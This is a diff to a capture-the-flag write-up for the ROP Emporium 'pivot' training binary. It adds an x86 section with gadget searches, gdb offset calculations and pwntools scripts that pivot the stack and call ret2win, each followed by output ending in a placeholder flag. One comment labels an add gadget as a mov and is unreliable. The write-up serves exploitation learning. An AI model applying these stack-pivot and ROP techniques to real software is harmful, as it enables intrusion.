@@ -204,10 +204,10 @@ buf_addr = int(p.recvline()[:-1], 16)
 
 foothold_plt = e.plt["foothold_function"]
 foothold_got = e.got["foothold_function"]
-add_rax_rbp = 0x4009c4
 pop_rbp = 0x4007c8
 pop_rax = 0x4009bb
-mov_rax = 0x4009c0
+add_rax = 0x4009c4   # add rax, rbp
+mov_rax = 0x4009c0   # mov rax, [rax]
 call_rax = 0x4006b0
 xchg = 0x4009bd
 
@@ -216,7 +216,7 @@ pay = flat(
 	pop_rax, foothold_got, # rax = [foothold_function@got]
 	mov_rax,               # rax = foothold_function@got
 	pop_rbp, 0x117,        # rbp = 0x117
-	add_rax_rbp,           # rax = ret2win
+	add_rax,               # rax = ret2win
 	call_rax               # call ret2win
 )
 
@@ -229,6 +229,212 @@ p.interactive()
 ```bash
 $ python3 test.py
 Thank you!
+foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
+ROPE{a_placeholder_32byte_flag!}
+$
+```
+<br />
+<br />
+
+# x86
+
+**Binary Protections:**
+```yaml
+pivot32: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0c3486910b643fccda05edba0fd6529cfef16803, not stripped
+
+[*] '/home/kali/ROP/pivot32'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    RUNPATH:    b'.'
+    Stripped:   No
+```
+<br />
+
+```yaml
+$ ROPgadget --binary pivot32 | grep "pop eax"
+0x0804882c : pop eax ; ret
+```
+```yaml
+$ ROPgadget --binary pivot32 | grep "xchg"
+0x0804882e : xchg esp, eax ; ret
+```
+- `pop eax ; ret = 0x804882c`
+- `xchg esp, eax ; ret = 0x804882e`
+
+<br />
+
+```bash
+$ gdb pivot32 -q
+...
+pwndbg> r
+...
+pivot by ROP Emporium
+x86
+
+Call ret2win() from libpivot
+The Old Gods kindly bestow upon you a place to pivot: 0xf7d76f10
+Send a ROP chain now and it will land there
+> ^C
+Program received signal SIGINT, Interrupt.
+...
+
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+...
+0xf7fbc000 0xf7fbd000 r-xp     1000      0 /home/kali/ROP/libpivot32.so
+0xf7fbd000 0xf7fbe000 r--p     1000      0 /home/kali/ROP/libpivot32.so
+0xf7fbe000 0xf7fbf000 rw-p     1000   1000 /home/kali/ROP/libpivot32.so
+...
+
+pwndbg> p/x 0xf7fbc000 - 0xf7d76f10
+$1 = 0x2450f0
+```
+- `buf ~ libc_base = 0x2450f0`
+
+```yaml
+$ readelf -a libpivot32.so | grep ret2win
+  18: 00000974   164 FUNC    GLOBAL DEFAULT   12 ret2win
+```
+- `ret2win = 0x974`
+
+<br />
+
+```python
+from pwn import *
+
+context.log_level = 'error'
+context.arch = 'x86'
+
+p = process('./pivot32')
+
+p.recvuntil(b'0x')
+buf_addr = int(p.recvline()[:-1], 16)
+libc_base = buf_addr + 0x2450f0
+ret2win = libc_base + 0x974
+
+pop_eax = 0x804882c
+xchg = 0x804882e
+
+pay = flat({44:pop_eax}, buf_addr, xchg)
+
+p.send(p32(ret2win))
+sleep(0.1)
+p.send(pay)
+
+p.interactive()
+```
+```bash
+$ python3 test.py
+Send a ROP chain now and it will land there
+Thank you!
+
+Now please send your stack smash
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+$
+```
+***
+<br />
+
+```yaml
+$ objdump -d pivot32
+Disassembly of section .text:
+...
+08048817 <uselessFunction>:
+ 8048817:       55                      push   %ebp
+ 8048818:       89 e5                   mov    %esp,%ebp
+ 804881a:       83 ec 08                sub    $0x8,%esp
+ 804881d:       e8 fe fc ff ff          call   8048520 <foothold_function@plt>
+ 8048822:       83 ec 0c                sub    $0xc,%esp
+ 8048825:       6a 01                   push   $0x1
+ 8048827:       e8 e4 fc ff ff          call   8048510 <exit@plt>
+
+0804882c <usefulGadgets>:
+ 804882c:       58                      pop    %eax
+ 804882d:       c3                      ret
+ 804882e:       94                      xchg   %eax,%esp
+ 804882f:       c3                      ret
+ 8048830:       8b 00                   mov    (%eax),%eax
+ 8048832:       c3                      ret
+ 8048833:       01 d8                   add    %ebx,%eax
+ 8048835:       c3                      ret
+...
+```
+```yaml
+$ ROPgadget --binary pivot32 | grep "pop ebx"
+0x080484a9 : pop ebx ; ret
+```
+```yaml
+$ ROPgadget --binary pivot32 | grep "call eax"
+0x080485f0 : call eax
+```
+- `pop eax ; ret = 0x804882c`
+- `xchg esp, eax ; ret = 0x804882e`
+- `mov eax, [eax] ; ret = 0x8048830`
+- `add eax, ebx ; ret = 0x8048833`
+- `pop ebx ; ret = 0x80484a9`
+- `call eax = 0x80485f0`
+
+<br />
+
+```yaml
+$ readelf -a libpivot32.so | grep ret2win
+  18: 00000974   164 FUNC    GLOBAL DEFAULT   12 ret2win
+$ readelf -a libpivot32.so | grep foot
+  10: 0000077d    43 FUNC    GLOBAL DEFAULT   12 foothold_function
+```
+- `ret2win - foothold_function = 0x1f7`
+
+<br />
+
+```python
+from pwn import *
+
+context.log_level = 'error'
+context.arch = 'x86'
+
+e = ELF('./pivot32')
+p = e.process()
+
+p.recvuntil(b'0x')
+buf_addr = int(p.recvline()[:-1], 16)
+
+foothold_plt = e.plt['foothold_function']
+foothold_got = e.got['foothold_function']
+pop_eax = 0x804882c
+pop_ebx = 0x80484a9
+mov_eax = 0x8048830    # mov eax, [eax]
+add_eax = 0x8048833    # mov eax, ebx
+call_eax = 0x080485f0
+xchg = 0x804882e
+
+pay = flat(
+	foothold_plt,          # call foothold_function_plt
+	pop_eax, foothold_got, # eax = [foothold_function_got]
+	mov_eax,			   # eax = foothold_function_got
+	pop_ebx, 0x1f7,		   # ebx = 0x1f7
+	add_eax,			   # eax = ret2win
+	call_eax 			   # call ret2win
+)
+
+pay1 = flat({44:pop_eax}, buf_addr, xchg)
+
+p.send(pay)
+sleep(0.1)
+p.send(pay1)
+
+p.interactive()
+```
+```bash
+$ python3 test.py
+Send a ROP chain now and it will land there
+Thank you!
+
+Now please send your stack smash
+> Thank you!
 foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
 ROPE{a_placeholder_32byte_flag!}
 $
